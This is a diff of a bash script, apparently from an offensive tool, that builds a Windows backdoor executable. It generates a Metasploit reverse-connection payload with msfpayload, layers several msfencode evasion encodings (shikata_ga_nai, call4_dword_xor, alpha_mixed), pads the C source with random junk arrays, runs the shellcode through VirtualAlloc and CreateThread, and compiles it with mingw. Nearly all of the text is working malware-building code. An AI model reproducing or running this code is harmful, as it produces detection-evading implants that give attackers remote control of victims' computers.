@@ -163,14 +163,14 @@ echo -e "\e[1;34m[*]\e[0m Let's get your payload setup...\n"
 		enumber=$((RANDOM%12+3))
 		seed=$((RANDOM%10000+1))
 		if [[ "${paychoice}" -le "2" ]]; then p=" SessionCommunicationTimeout=600"; fi
-		echo -e '#include <stdio.h>\nunsigned char ufs[]=' > ${logfldr}/backdoor.c
-		for (( i=1; i<=10000;i++ )) do echo ${RANDOM} ${i}; done | sort -k1| cut -d " " -f2| head -${seed} | sed 's/$/"/' | sed 's/^/"/' | sed '$a;' >> ${logfldr}/backdoor.c
-		msfpayload "${payload}" LHOST="${lhost}" LPORT="${port}"${p} EXITFUNC=thread R | msfencode -e x86/shikata_ga_nai -c ${enumber} -t raw | msfencode -e x86/jmp_call_additive -c ${enumber} -t raw | msfencode -e x86/call4_dword_xor -c ${enumber} -t raw | msfencode -e x86/shikata_ga_nai -c ${enumber} | sed -e 's/+/ /g' | sed -e 's/buf = /unsigned char micro[]=/g' | sed '$a;' >> ${logfldr}/backdoor.c
-		echo -e "int main(void) { ((void (*)())micro)();}\nunsigned char tap[]=" >> ${logfldr}/backdoor.c
-		for (( i=1; i<=999999;i++ )) do echo ${RANDOM} ${i}; done | sort -k1| cut -d " " -f2| head -${seed} | sed 's/$/"/' | sed 's/^/"/'| sed '$a;' >> ${logfldr}/backdoor.c
-		echo -e "\n\e[1;34m[*]\e[0m Compiling executable..."
-		${mingw} -Wall ${logfldr}/backdoor.c -o ${logfldr}/backdoor.exe > /dev/null 2>&1
-		rm ${logfldr}/backdoor.c
+                echo -e "#include <sys/types.h>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <time.h>\n#include <ctype.h>\n#include <windows.h>\nDWORD WINAPI exec_payload(LPVOID lpParameter)\n{\n\tasm(\n\t\"movl %0, %%eax;\"\n\t\"call %%eax;\"\n\t:\n\t:\"r\"(lpParameter)\n\t:\"%eax\");\n\treturn 0;\n}\nvoid sys_bineval(char *argv)\n{\n\tsize_t len;\n\tDWORD pID;\n\tchar *code;\n\tlen = (size_t)strlen(argv);\n\tcode = (char *) VirtualAlloc(NULL, len+1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\tstrncpy(code, argv, len);\n\tWaitForSingleObject(CreateThread(NULL, 0, exec_payload, code, 0, &pID), INFINITE);\n}\n\nunsigned char ufs[]=" > ${logfldr}/backdoor.c
+                for (( i=1; i<=10000;i++ )) do echo ${RANDOM} ${i}; done | sort -k1| cut -d " " -f2| head -${seed} | sed 's/$/"/' | sed 's/^/"/' | sed '$a;' >> ${logfldr}/backdoor.c
+                msfpayload "${payload}" LHOST="${lhost}" LPORT="${port}"${n} EXITFUNC=thread R | msfencode -e x86/jmp_call_additive -c ${enumber} -t raw | msfencode -e x86/call4_dword_xor -c ${enumber} -t raw | msfencode -e x86/shikata_ga_nai -c ${enumber} -t raw | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX | sed 's/^/void main()\n{\n\tchar *micro = \"/' | sed '$ s/$/"/' | sed '$a;' >> ${logfldr}/backdoor.c
+                echo -e "\tsys_bineval(micro);\n\texit(0);\n}\nunsigned char tap[]=" >> ${logfldr}/backdoor.c
+                for (( i=1; i<=999999;i++ )) do echo ${RANDOM} ${i}; done | sort -k1| cut -d " " -f2| head -${seed} | sed 's/$/"/' | sed 's/^/"/'| sed '$a;' >> ${logfldr}/backdoor.c
+                echo -e "\n\e[1;34m[*]\e[0m Compiling executable..."
+                ${mingw} -Wall ${logfldr}/backdoor.c -o ${logfldr}/backdoor.exe > /dev/null 2>&1
+                rm ${logfldr}/backdoor.c
 		strip --strip-debug ${logfldr}/backdoor.exe
 
 		if [ -z "${enable_crypter}" ]; then
